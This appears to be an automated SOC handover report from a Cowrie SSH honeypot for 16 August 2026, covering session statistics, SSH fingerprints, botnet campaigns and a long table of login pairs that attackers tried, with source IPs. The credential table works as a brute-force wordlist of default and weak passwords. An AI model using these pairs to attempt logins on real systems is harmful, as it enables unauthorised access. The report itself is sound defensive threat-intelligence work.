# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-16 |
| **Generated At** | 2026-08-16T20:27:07Z |
| **Shift Time** | 20:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **4413** |
| Confirmed Threats | **4398** |
| False Positives Filtered | **15** (0.3%) |
| Unique Attacker IPs | **81** |
| Countries of Origin | **33** |
| High Severity Cases | **334** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **4079** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **351** |
| Unique Credential Pairs | **294** |
| Unique Usernames | **130** |
| Unique Passwords | **193** |
| Successful Auth Pairs | **341** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 57 |
| `admin` | 33 |
| `ubuntu` | 18 |
| `user` | 17 |
| `config` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 18 |
| `123` | 13 |
| `1234` | 11 |
| `admin` | 10 |
| `passwd` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 6 |
| `unknown` | `unknown` | 6 |
| `Default` | `passwd` | 5 |
| `config` | `159753` | 5 |
| `support` | `test` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `123123123` | `81.172.74.163` | 2026-08-16T16:55:43 |
| `config` | `123123` | `209.173.10.75` | 2026-08-16T16:56:31 |
| `user` | `Passw0rd` | `111.198.53.188` | 2026-08-16T16:56:33 |
| `config` | `123123` | `107.135.117.245` | 2026-08-16T16:56:38 |
| `config` | `123123` | `65.181.79.60` | 2026-08-16T16:56:42 |
| `root` | `p@ssw0rd` | `92.118.39.71` | 2026-08-16T16:56:43 |
| `config` | `123123` | `128.199.118.234` | 2026-08-16T16:56:51 |
| `root` | `﻿------fuck------` | `120.26.202.34` | 2026-08-16T16:56:59 |
| `root` | `Qq123456` | `45.142.193.164` | 2026-08-16T16:57:34 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-08-16T16:58:46 |
| `root` | `password` | `92.118.39.71` | 2026-08-16T17:00:55 |
| `root` | `qwerty` | `92.118.39.71` | 2026-08-16T17:02:58 |
| `ubuntu` | `aaaa8888` | `185.74.59.14` | 2026-08-16T17:05:33 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-16T17:06:35 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-16T17:06:35 |
| `admin` | `admin` | `116.99.174.243` | 2026-08-16T17:06:43 |
| `root` | `root1` | `92.118.39.71` | 2026-08-16T17:06:59 |
| `root` | `admin` | `116.99.170.187` | 2026-08-16T17:08:08 |
| `root` | `root12` | `92.118.39.71` | 2026-08-16T17:08:59 |
| `root` | `root123` | `92.118.39.71` | 2026-08-16T17:10:57 |
| `user` | `123123123` | `96.1.40.151` | 2026-08-16T17:11:40 |
| `Default` | `passwd` | `10.0.0.73` | 2026-08-16T17:11:41 |
| `user` | `123123123` | `223.99.212.58` | 2026-08-16T17:11:51 |
| `root` | `root2026` | `92.118.39.71` | 2026-08-16T17:12:58 |
| `postgres` | `password1!` | `217.165.22.192` | 2026-08-16T17:13:20 |
| `ubnt` | `ubnt` | `116.99.174.243` | 2026-08-16T17:14:29 |
| `user` | `user` | `116.99.174.243` | 2026-08-16T17:14:38 |
| `admin` | `admin` | `47.253.5.130` | 2026-08-16T17:14:38 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-16T17:14:38 |
| `root` | `welcome` | `92.118.39.71` | 2026-08-16T17:15:07 |
| `root` | `ZXCzxc123` | `45.142.193.164` | 2026-08-16T17:15:47 |
| `squid` | `squid` | `116.99.170.187` | 2026-08-16T17:16:25 |
| `admin` | `123456` | `92.118.39.71` | 2026-08-16T17:17:18 |
| `ubuntu` | `hp@123` | `185.74.59.14` | 2026-08-16T17:17:28 |
| `admin` | `123qwe` | `92.118.39.71` | 2026-08-16T17:19:18 |
| `admin` | `123qwerty` | `92.118.39.71` | 2026-08-16T17:21:17 |
| `support` | `support` | `116.99.174.243` | 2026-08-16T17:22:23 |
| `root` | `@` | `116.99.170.187` | 2026-08-16T17:23:00 |
| `admin` | `21` | `92.118.39.71` | 2026-08-16T17:23:10 |
| `admin` | `321` | `92.118.39.71` | 2026-08-16T17:25:05 |
| `user` | `Passw0rd` | `189.56.0.19` | 2026-08-16T17:25:10 |
| `user` | `Passw0rd` | `117.253.130.123` | 2026-08-16T17:25:20 |
| `support` | `support` | `176.53.159.196` | 2026-08-16T17:26:41 |
| `admin` | `654321` | `92.118.39.71` | 2026-08-16T17:27:05 |
| `admin` | `admin` | `8.208.44.152` | 2026-08-16T17:27:17 |
| `config` | `159753` | `10.0.0.73` | 2026-08-16T17:28:02 |
| `admin` | `P@ssw0rd` | `92.118.39.71` | 2026-08-16T17:29:10 |
| `admin` | `admin@123` | `116.99.174.243` | 2026-08-16T17:29:24 |
| `config` | `159753` | `194.31.8.12` | 2026-08-16T17:29:37 |
| `config` | `159753` | `175.206.113.91` | 2026-08-16T17:29:47 |
| `Default` | `passwd` | `223.99.212.58` | 2026-08-16T17:30:11 |
| `support` | `test` | `116.113.241.82` | 2026-08-16T17:30:16 |
| `Default` | `passwd` | `196.191.142.67` | 2026-08-16T17:30:20 |
| `Default` | `passwd` | `200.232.114.71` | 2026-08-16T17:30:25 |
| `Default` | `passwd` | `14.194.128.158` | 2026-08-16T17:30:35 |
| `admin` | `Password` | `92.118.39.71` | 2026-08-16T17:31:20 |
| `root` | `root123` | `116.99.174.243` | 2026-08-16T17:31:47 |
| `postgres` | `Password123!` | `217.165.22.192` | 2026-08-16T17:32:26 |
| `admin` | `admin` | `92.118.39.71` | 2026-08-16T17:33:26 |
| `system` | `OkwKcECs8qJP2Z` | `171.231.196.16` | 2026-08-16T17:34:03 |
| `guest` | `guest` | `171.231.196.16` | 2026-08-16T17:34:26 |
| `admin` | `admin12` | `92.118.39.71` | 2026-08-16T17:35:20 |
| `test` | `test` | `171.231.196.16` | 2026-08-16T17:36:22 |
| `user` | `123456` | `31.77.227.120` | 2026-08-16T17:36:59 |
| `admin` | `admin123` | `92.118.39.71` | 2026-08-16T17:37:12 |
| `user` | `admin` | `31.77.227.120` | 2026-08-16T17:37:17 |
| `user` | `Aa@123456` | `31.77.227.120` | 2026-08-16T17:38:02 |
| `admin` | `admin2026` | `92.118.39.71` | 2026-08-16T17:39:05 |
| `admin` | `0l0ctyQh243O63uD` | `116.99.170.187` | 2026-08-16T17:39:17 |
| `admin` | `letmein` | `92.118.39.71` | 2026-08-16T17:40:59 |
| `support` | `test` | `10.0.0.73` | 2026-08-16T17:41:41 |
| `admin` | `password` | `116.99.170.187` | 2026-08-16T17:42:22 |
| `admin` | `pa$w0rd` | `92.118.39.71` | 2026-08-16T17:42:56 |
| `admin` | `1234` | `27.79.43.66` | 2026-08-16T17:43:58 |
| `admin` | `passw0rd` | `92.118.39.71` | 2026-08-16T17:45:02 |
| `config` | `159753` | `119.160.166.237` | 2026-08-16T17:45:33 |
| `config` | `159753` | `188.219.104.210` | 2026-08-16T17:45:40 |
| `admin` | `admin01` | `27.79.43.66` | 2026-08-16T17:45:52 |
| `admin` | `password` | `92.118.39.71` | 2026-08-16T17:47:10 |
| `admin` | `123456` | `27.79.43.66` | 2026-08-16T17:47:39 |
| `admin` | `qwerty` | `92.118.39.71` | 2026-08-16T17:49:17 |
| `support` | `support` | `10.0.0.73` | 2026-08-16T17:50:27 |
| `admin` | `admin123` | `116.99.170.187` | 2026-08-16T17:50:47 |
| `administrator` | `123456` | `92.118.39.71` | 2026-08-16T17:51:15 |
| `postgres` | `postgres123` | `217.165.22.192` | 2026-08-16T17:51:33 |
| `user` | `1234` | `116.99.170.187` | 2026-08-16T17:53:05 |
| `administrator` | `P@ssw0rd` | `92.118.39.71` | 2026-08-16T17:53:08 |
| `administrator` | `administrator` | `92.118.39.71` | 2026-08-16T17:54:55 |
| `admin` | `default` | `116.99.170.187` | 2026-08-16T17:56:25 |
| `administrator` | `administrator123` | `92.118.39.71` | 2026-08-16T17:56:45 |
| `ftp` | `ftp` | `27.79.43.66` | 2026-08-16T17:57:38 |
| `administrator` | `passw0rd` | `92.118.39.71` | 2026-08-16T17:58:34 |
| `support` | `test` | `219.144.16.16` | 2026-08-16T17:58:36 |
| `support` | `test` | `80.233.77.136` | 2026-08-16T17:58:44 |
| `solana` | `solana` | `195.178.110.26` | 2026-08-16T17:58:46 |
| `operator` | `operator` | `116.99.170.187` | 2026-08-16T17:58:53 |
| `sol` | `sol` | `195.178.110.26` | 2026-08-16T18:00:45 |
| `unknown` | `unknown` | `10.0.0.73` | 2026-08-16T18:01:20 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-08-16T18:02:25 |
| `solv` | `solv` | `195.178.110.26` | 2026-08-16T18:02:39 |
| `unknown` | `unknown` | `117.191.83.250` | 2026-08-16T18:02:57 |
| `unknown` | `unknown` | `218.202.143.68` | 2026-08-16T18:03:06 |
| `config` | `qwer1234` | `218.29.231.106` | 2026-08-16T18:03:32 |
| `config` | `qwer1234` | `196.188.187.85` | 2026-08-16T18:03:42 |
| `centos` | `ubuntu` | `196.190.41.137` | 2026-08-16T18:03:43 |
| `centos` | `ubuntu` | `114.30.180.58` | 2026-08-16T18:03:53 |
| `ubuntu` | `ubuntu` | `195.178.110.26` | 2026-08-16T18:04:36 |
| `user3` | `1234` | `45.198.224.26` | 2026-08-16T18:05:50 |
| `ubuntu` | `Zxcv@1234` | `185.74.59.14` | 2026-08-16T18:05:55 |
| `sol` | `123` | `195.178.110.26` | 2026-08-16T18:06:27 |
| `sol` | `1234` | `195.178.110.26` | 2026-08-16T18:08:13 |
| `root` | `a123456@` | `45.142.193.164` | 2026-08-16T18:09:42 |
| `validator` | `validator` | `195.178.110.26` | 2026-08-16T18:10:04 |
| `postgres` | `postgres@123` | `217.165.22.192` | 2026-08-16T18:10:40 |
| `node` | `node` | `195.178.110.26` | 2026-08-16T18:11:59 |
| `sol` | `sol321` | `195.178.110.26` | 2026-08-16T18:13:52 |
| `centos` | `ubuntu` | `10.0.0.73` | 2026-08-16T18:15:13 |
| `sol` | `321` | `195.178.110.26` | 2026-08-16T18:15:48 |
| `sol` | `4321` | `195.178.110.26` | 2026-08-16T18:17:48 |
| `ubuntu` | `Aa1234567890` | `185.74.59.14` | 2026-08-16T18:18:01 |
| `unknown` | `unknown` | `138.118.213.68` | 2026-08-16T18:18:54 |
| `blank` | `passwd` | `10.0.0.73` | 2026-08-16T18:19:01 |
| `unknown` | `unknown` | `196.219.93.98` | 2026-08-16T18:19:06 |
| `ubuntu` | `1234qwer` | `195.178.110.26` | 2026-08-16T18:19:43 |
| `ubuntu` | `qwer1234` | `195.178.110.26` | 2026-08-16T18:21:32 |
| `ubuntu` | `1q2w3e4r` | `195.178.110.26` | 2026-08-16T18:23:27 |
| `validator` | `solana` | `195.178.110.26` | 2026-08-16T18:25:21 |
| `oneadmin` | `opennebula` | `195.178.110.26` | 2026-08-16T18:27:12 |
| `root` | `Abc@123456` | `45.142.193.164` | 2026-08-16T18:27:56 |
| `vyos` | `vyos` | `195.178.110.26` | 2026-08-16T18:29:07 |
| `postgres` | `postgres1234` | `217.165.22.192` | 2026-08-16T18:29:47 |
| `vyatta` | `vyatta` | `195.178.110.26` | 2026-08-16T18:31:08 |
| `centos` | `ubuntu` | `50.188.204.213` | 2026-08-16T18:31:59 |
| `centos` | `ubuntu` | `170.233.29.175` | 2026-08-16T18:32:13 |
| `ha-azureadmin` | `ha-azureadmin` | `195.178.110.26` | 2026-08-16T18:33:03 |
| `ubnt` | `toor` | `10.0.0.73` | 2026-08-16T18:34:41 |
| `user` | `1` | `195.178.110.26` | 2026-08-16T18:34:58 |
| `ubnt` | `toor` | `60.166.8.174` | 2026-08-16T18:36:21 |
| `ubnt` | `toor` | `85.152.57.60` | 2026-08-16T18:36:30 |
| `user` | `123456` | `195.178.110.26` | 2026-08-16T18:36:56 |
| `blank` | `passwd` | `69.126.144.30` | 2026-08-16T18:37:08 |
| `jenkins` | `jenkins` | `195.178.110.26` | 2026-08-16T18:38:50 |
| `root` | `aB123456` | `77.239.124.241` | 2026-08-16T18:38:59 |
| `angel` | `angel` | `77.239.124.241` | 2026-08-16T18:39:03 |
| `server` | `1234` | `77.239.124.241` | 2026-08-16T18:39:08 |
| `sam` | `abc123` | `77.239.124.241` | 2026-08-16T18:39:12 |
| `ansible` | `qwerty` | `77.239.124.241` | 2026-08-16T18:39:17 |
| `prem` | `12345` | `77.239.124.241` | 2026-08-16T18:39:21 |
| `deploy` | `123123` | `77.239.124.241` | 2026-08-16T18:39:25 |
| `ali` | `ali` | `77.239.124.241` | 2026-08-16T18:39:30 |
| `fastuser` | `fastuser` | `77.239.124.241` | 2026-08-16T18:39:34 |
| `zimbra` | `zimbra` | `77.239.124.241` | 2026-08-16T18:39:38 |
| `teamspeak` | `raspberry` | `77.239.124.241` | 2026-08-16T18:39:42 |
| `claude` | `1` | `77.239.124.241` | 2026-08-16T18:39:47 |
| `root` | `1` | `77.239.124.241` | 2026-08-16T18:39:50 |
| `systemd` | `1q2w3e4r` | `77.239.124.241` | 2026-08-16T18:39:54 |
| `www` | `12345678` | `77.239.124.241` | 2026-08-16T18:39:58 |
| `root` | `Welcome@123` | `77.239.124.241` | 2026-08-16T18:40:01 |
| `devuser` | `devuser` | `77.239.124.241` | 2026-08-16T18:40:05 |
| `admin` | `abc123` | `77.239.124.241` | 2026-08-16T18:40:11 |
| `alex` | `alex` | `77.239.124.241` | 2026-08-16T18:40:17 |
| `ai` | `Aa123456` | `77.239.124.241` | 2026-08-16T18:40:23 |
| `root1` | `123456` | `77.239.124.241` | 2026-08-16T18:40:29 |
| `hadoop` | `hadoop123` | `77.239.124.241` | 2026-08-16T18:40:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `45.79.207.71` | 2026-08-16T18:40:37 |
| `config` | `config` | `77.239.124.241` | 2026-08-16T18:40:41 |
| `root` | `!QAZ2wsx` | `195.178.110.26` | 2026-08-16T18:40:42 |
| `jellyfin` | `root` | `77.239.124.241` | 2026-08-16T18:40:46 |
| `sam` | `1234567890` | `77.239.124.241` | 2026-08-16T18:40:52 |
| `ts3` | `ts3` | `77.239.124.241` | 2026-08-16T18:40:58 |
| `fa` | `fa` | `77.239.124.241` | 2026-08-16T18:41:03 |
| `root` | `Password` | `77.239.124.241` | 2026-08-16T18:41:08 |
| `fastuser` | `1234567890` | `77.239.124.241` | 2026-08-16T18:41:13 |
| `cloud` | `1` | `77.239.124.241` | 2026-08-16T18:41:19 |
| `martin` | `martin` | `77.239.124.241` | 2026-08-16T18:41:24 |
| `root` | `Password1` | `77.239.124.241` | 2026-08-16T18:41:30 |
| `test1` | `test1` | `77.239.124.241` | 2026-08-16T18:41:35 |
| `ts` | `ts` | `77.239.124.241` | 2026-08-16T18:41:40 |
| `ethan` | `ethan` | `77.239.124.241` | 2026-08-16T18:41:45 |
| `home` | `home` | `77.239.124.241` | 2026-08-16T18:41:51 |
| `bot` | `bot` | `77.239.124.241` | 2026-08-16T18:41:56 |
| `kali` | `kali` | `77.239.124.241` | 2026-08-16T18:42:01 |
| `root` | `root@123` | `77.239.124.241` | 2026-08-16T18:42:06 |
| `odoo16` | `123` | `77.239.124.241` | 2026-08-16T18:42:12 |
| `cloud` | `1234` | `77.239.124.241` | 2026-08-16T18:42:17 |
| `dmdba` | `dmdba123456` | `77.239.124.241` | 2026-08-16T18:42:22 |
| `ubuntu` | `Aa123321` | `185.74.59.14` | 2026-08-16T18:42:27 |
| `user` | `user` | `77.239.124.241` | 2026-08-16T18:42:28 |
| `coder` | `123456` | `77.239.124.241` | 2026-08-16T18:42:33 |
| `pec` | `pec` | `195.178.110.26` | 2026-08-16T18:42:37 |
| `root` | `1q2w3e4r` | `77.239.124.241` | 2026-08-16T18:42:38 |
| `testuser` | `123` | `77.239.124.241` | 2026-08-16T18:42:44 |
| `tester` | `password` | `77.239.124.241` | 2026-08-16T18:42:49 |
| `tactical` | `12345678` | `77.239.124.241` | 2026-08-16T18:42:54 |
| `splunk` | `splunk` | `77.239.124.241` | 2026-08-16T18:42:59 |
| `kingbase` | `123456` | `77.239.124.241` | 2026-08-16T18:43:04 |
| `deploy` | `deploy123` | `77.239.124.241` | 2026-08-16T18:43:10 |
| `jack` | `1234` | `77.239.124.241` | 2026-08-16T18:43:15 |
| `debian` | `Aa123456.` | `77.239.124.241` | 2026-08-16T18:43:20 |
| `ai` | `ai` | `77.239.124.241` | 2026-08-16T18:43:26 |
| `ansible` | `passwd` | `77.239.124.241` | 2026-08-16T18:43:31 |
| `aaa` | `123456` | `77.239.124.241` | 2026-08-16T18:43:36 |
| `gateway` | `gateway` | `77.239.124.241` | 2026-08-16T18:43:42 |
| `deploy` | `dev` | `77.239.124.241` | 2026-08-16T18:43:47 |
| `myuser` | `myuser` | `77.239.124.241` | 2026-08-16T18:43:52 |
| `user1` | `root@123` | `77.239.124.241` | 2026-08-16T18:43:57 |
| `ai` | `toor` | `77.239.124.241` | 2026-08-16T18:44:02 |
| `deploy` | `1` | `77.239.124.241` | 2026-08-16T18:44:07 |
| `gabriel` | `gabriel` | `77.239.124.241` | 2026-08-16T18:44:13 |
| `root` | `Huawei@123` | `77.239.124.241` | 2026-08-16T18:44:18 |
| `runner` | `test` | `77.239.124.241` | 2026-08-16T18:44:23 |
| `openclaw` | `1234` | `77.239.124.241` | 2026-08-16T18:44:28 |
| `usuario` | `usuario` | `77.239.124.241` | 2026-08-16T18:44:34 |
| `q` | `q123` | `195.178.110.26` | 2026-08-16T18:44:35 |
| `root` | `r00t` | `77.239.124.241` | 2026-08-16T18:44:39 |
| `root` | `baidu@123` | `77.239.124.241` | 2026-08-16T18:44:45 |
| `rocky` | `1234` | `77.239.124.241` | 2026-08-16T18:44:50 |
| `cloud` | `cloud123!` | `77.239.124.241` | 2026-08-16T18:44:55 |
| `rocky` | `1` | `77.239.124.241` | 2026-08-16T18:45:00 |
| `postgres` | `postgres123` | `77.239.124.241` | 2026-08-16T18:45:06 |
| `ubuntu` | `123456789` | `77.239.124.241` | 2026-08-16T18:45:11 |
| `gitlab-runner` | `123` | `77.239.124.241` | 2026-08-16T18:45:17 |
| `root` | `12qwaszx` | `77.239.124.241` | 2026-08-16T18:45:22 |
| `rdpuser` | `123` | `77.239.124.241` | 2026-08-16T18:45:27 |
| `root` | `rootroot` | `77.239.124.241` | 2026-08-16T18:45:32 |
| `root` | `abcd1234` | `77.239.124.241` | 2026-08-16T18:45:38 |
| `minecraft` | `123456` | `77.239.124.241` | 2026-08-16T18:45:44 |
| `ubuntu` | `1234` | `77.239.124.241` | 2026-08-16T18:45:49 |
| `master` | `qwerty` | `77.239.124.241` | 2026-08-16T18:45:54 |
| `appuser` | `root` | `77.239.124.241` | 2026-08-16T18:46:00 |
| `debian` | `toor` | `77.239.124.241` | 2026-08-16T18:46:05 |
| `rock` | `rock` | `77.239.124.241` | 2026-08-16T18:46:11 |
| `root` | `huawei@123` | `77.239.124.241` | 2026-08-16T18:46:16 |
| `root` | `p@ssword` | `77.239.124.241` | 2026-08-16T18:46:22 |
| `root` | `1029384756` | `77.239.124.241` | 2026-08-16T18:46:27 |
| `q` | `123` | `195.178.110.26` | 2026-08-16T18:46:29 |
| `user` | `123456` | `77.239.124.241` | 2026-08-16T18:46:33 |
| `linux` | `linux` | `77.239.124.241` | 2026-08-16T18:46:38 |
| `jellyfin` | `123` | `77.239.124.241` | 2026-08-16T18:46:43 |
| `ubuntu` | `password` | `77.239.124.241` | 2026-08-16T18:46:49 |
| `root` | `!qaz@WSX` | `77.239.124.241` | 2026-08-16T18:46:54 |
| `drcomadmin` | `drcomadmin123` | `77.239.124.241` | 2026-08-16T18:47:00 |
| `root` | `Password@123` | `77.239.124.241` | 2026-08-16T18:47:05 |
| `odoo` | `odoo` | `77.239.124.241` | 2026-08-16T18:47:11 |
| `cloud` | `cloud` | `77.239.124.241` | 2026-08-16T18:47:17 |
| `root` | `aa123456` | `77.239.124.241` | 2026-08-16T18:47:22 |
| `user` | `password` | `77.239.124.241` | 2026-08-16T18:47:27 |
| `ubuntu` | `root` | `77.239.124.241` | 2026-08-16T18:47:33 |
| `sysupdate` | `Password1` | `77.239.124.241` | 2026-08-16T18:47:39 |
| `arthur` | `arthur` | `77.239.124.241` | 2026-08-16T18:47:44 |
| `oracle` | `oracle123` | `77.239.124.241` | 2026-08-16T18:47:50 |
| `app` | `root` | `77.239.124.241` | 2026-08-16T18:47:55 |
| `ftpuser` | `p@ssw0rd` | `77.239.124.241` | 2026-08-16T18:48:01 |
| `openclaw` | `openclaw` | `77.239.124.241` | 2026-08-16T18:48:06 |
| `asterisk` | `asterisk` | `77.239.124.241` | 2026-08-16T18:48:11 |
| `root` | `999` | `77.239.124.241` | 2026-08-16T18:48:16 |
| `root` | `test@123` | `77.239.124.241` | 2026-08-16T18:48:22 |
| `ecommerce` | `ecommerce` | `77.239.124.241` | 2026-08-16T18:48:27 |
| `ubnt` | `webadmin` | `10.0.0.73` | 2026-08-16T18:48:29 |
| `btc` | `btc` | `195.178.110.26` | 2026-08-16T18:48:30 |
| `claude` | `claude` | `77.239.124.241` | 2026-08-16T18:48:32 |
| `ts3` | `123` | `77.239.124.241` | 2026-08-16T18:48:38 |
| `admin` | `admin123` | `77.239.124.241` | 2026-08-16T18:48:43 |
| `pi` | `p@ssw0rd` | `77.239.124.241` | 2026-08-16T18:48:48 |
| `postgres` | `postgres@1234` | `217.165.22.192` | 2026-08-16T18:48:54 |
| `vncuser` | `123456` | `77.239.124.241` | 2026-08-16T18:48:54 |
| `rancher` | `rancher` | `77.239.124.241` | 2026-08-16T18:48:59 |
| `git` | `dev` | `77.239.124.241` | 2026-08-16T18:49:05 |
| `uploader` | `uploader` | `77.239.124.241` | 2026-08-16T18:49:10 |
| `nvidia` | `nvidia` | `77.239.124.241` | 2026-08-16T18:49:16 |
| `daniel` | `daniel` | `77.239.124.241` | 2026-08-16T18:49:21 |
| `localhost` | `localhost` | `77.239.124.241` | 2026-08-16T18:49:27 |
| `root` | `qwe123456` | `77.239.124.241` | 2026-08-16T18:49:32 |
| `rancher` | `rancher123` | `77.239.124.241` | 2026-08-16T18:49:37 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `172.239.64.86` | 2026-08-16T18:49:38 |
| `root` | `!Q@W3e4r` | `77.239.124.241` | 2026-08-16T18:49:43 |
| `root` | `Aa12345678` | `45.142.193.164` | 2026-08-16T18:49:43 |
| `nexus` | `nexus` | `77.239.124.241` | 2026-08-16T18:49:48 |
| `root` | `1qaz@wsx` | `77.239.124.241` | 2026-08-16T18:49:53 |
| `user` | `root` | `77.239.124.241` | 2026-08-16T18:49:58 |
| `testuser` | `123456` | `77.239.124.241` | 2026-08-16T18:50:03 |
| `ubuntu` | `12345678` | `77.239.124.241` | 2026-08-16T18:50:08 |
| `admin2` | `abc123` | `77.239.124.241` | 2026-08-16T18:50:14 |
| `server` | `123456` | `77.239.124.241` | 2026-08-16T18:50:20 |
| `hadoop` | `123` | `77.239.124.241` | 2026-08-16T18:50:25 |
| `admin` | `051178` | `77.239.124.241` | 2026-08-16T18:50:30 |
| `foo` | `bar` | `195.178.110.26` | 2026-08-16T18:50:32 |
| `alex` | `1` | `77.239.124.241` | 2026-08-16T18:50:36 |
| `sftpuser` | `123` | `77.239.124.241` | 2026-08-16T18:50:41 |
| `hamed` | `hamed` | `77.239.124.241` | 2026-08-16T18:50:47 |
| `postgres` | `123` | `77.239.124.241` | 2026-08-16T18:50:52 |
| `root` | `102030` | `77.239.124.241` | 2026-08-16T18:50:57 |
| `ubuntu` | `qwe123456` | `77.239.124.241` | 2026-08-16T18:51:03 |
| `playground` | `playground` | `77.239.124.241` | 2026-08-16T18:51:08 |
| `deployer` | `1234567890` | `77.239.124.241` | 2026-08-16T18:51:13 |
| `runner` | `123` | `77.239.124.241` | 2026-08-16T18:51:19 |
| `portal` | `portal` | `77.239.124.241` | 2026-08-16T18:51:24 |
| `user1` | `123456789` | `77.239.124.241` | 2026-08-16T18:51:29 |
| `dev` | `123321` | `77.239.124.241` | 2026-08-16T18:51:35 |
| `ubuntu` | `qwe123` | `77.239.124.241` | 2026-08-16T18:51:40 |
| `docker` | `docker123` | `77.239.124.241` | 2026-08-16T18:51:46 |
| `plex` | `plex` | `77.239.124.241` | 2026-08-16T18:51:51 |
| `liyang` | `123456` | `77.239.124.241` | 2026-08-16T18:51:57 |
| `pi` | `raspberry` | `77.239.124.241` | 2026-08-16T18:52:02 |
| `root` | `admin` | `77.239.124.241` | 2026-08-16T18:52:08 |
| `root` | `p@ssw0rd` | `77.239.124.241` | 2026-08-16T18:52:13 |
| `dspace` | `dspace` | `77.239.124.241` | 2026-08-16T18:52:18 |
| `root` | `Aa1234567890` | `77.239.124.241` | 2026-08-16T18:52:23 |
| `bar` | `bar` | `195.178.110.26` | 2026-08-16T18:52:25 |
| `ftp` | `ftp` | `77.239.124.241` | 2026-08-16T18:52:29 |
| `root` | `redhat` | `77.239.124.241` | 2026-08-16T18:52:34 |
| `tomcat` | `tomcat` | `77.239.124.241` | 2026-08-16T18:52:40 |
| `guest` | `123456` | `77.239.124.241` | 2026-08-16T18:52:45 |
| `ansible` | `ansible` | `77.239.124.241` | 2026-08-16T18:52:51 |
| `root` | `28011988` | `77.239.124.241` | 2026-08-16T18:52:56 |
| `root` | `147258` | `77.239.124.241` | 2026-08-16T18:53:02 |
| `deploy` | `user` | `77.239.124.241` | 2026-08-16T18:53:07 |
| `testuser` | `test` | `77.239.124.241` | 2026-08-16T18:53:12 |
| `frappe` | `123` | `77.239.124.241` | 2026-08-16T18:53:17 |
| `root` | `19901017` | `77.239.124.241` | 2026-08-16T18:53:23 |
| `adminuser` | `adminuser` | `77.239.124.241` | 2026-08-16T18:53:28 |
| `pi` | `1234` | `77.239.124.241` | 2026-08-16T18:53:33 |
| `admin1` | `123456` | `77.239.124.241` | 2026-08-16T18:53:39 |
| `root` | `qwe123` | `77.239.124.241` | 2026-08-16T18:53:44 |
| `app` | `rootroot` | `77.239.124.241` | 2026-08-16T18:53:49 |
| `tester` | `test` | `77.239.124.241` | 2026-08-16T18:53:55 |
| `ubuntu` | `123321` | `77.239.124.241` | 2026-08-16T18:54:00 |
| `deploy` | `toor` | `77.239.124.241` | 2026-08-16T18:54:05 |
| `vagrant` | `vagrant` | `77.239.124.241` | 2026-08-16T18:54:10 |
| `ducc0x` | `phuvanduc` | `77.239.124.241` | 2026-08-16T18:54:16 |
| `lab` | `lab` | `195.178.110.26` | 2026-08-16T18:54:18 |
| `ubuntu` | `Aa123456789!` | `185.74.59.14` | 2026-08-16T18:54:20 |
| `cw` | `cw` | `77.239.124.241` | 2026-08-16T18:54:21 |
| `postgres` | `123456` | `77.239.124.241` | 2026-08-16T18:54:26 |
| `rdpuser` | `rdpuser` | `77.239.124.241` | 2026-08-16T18:54:31 |
| `frappe` | `admin` | `77.239.124.241` | 2026-08-16T18:54:36 |
| `stack` | `stack` | `77.239.124.241` | 2026-08-16T18:54:41 |
| `alex` | `12345678` | `77.239.124.241` | 2026-08-16T18:54:46 |
| `dev` | `dev` | `77.239.124.241` | 2026-08-16T18:54:52 |
| `server` | `root` | `77.239.124.241` | 2026-08-16T18:54:57 |
| `core` | `P@ssw0rd` | `77.239.124.241` | 2026-08-16T18:55:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **4413** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 272 |
| OpenSSH | 35 |
| AsyncSSH (Python) | 24 |
| libssh | 12 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 184 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 35 | 33 |
| `16443846184e...` | Generic scanner | 35 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 32 | 1 |
| `fda360b1b4f4...` | Mirai/variant | 24 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 184 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 35 | 33 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 35 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 32 | 1 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 24 | 4 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 11 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 10 | 5 | — |
| `e45f2d6d7f79...` | Go SSH scanner | 6 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 31 | 1 | `T1082, T1592, T1078, T1083` |

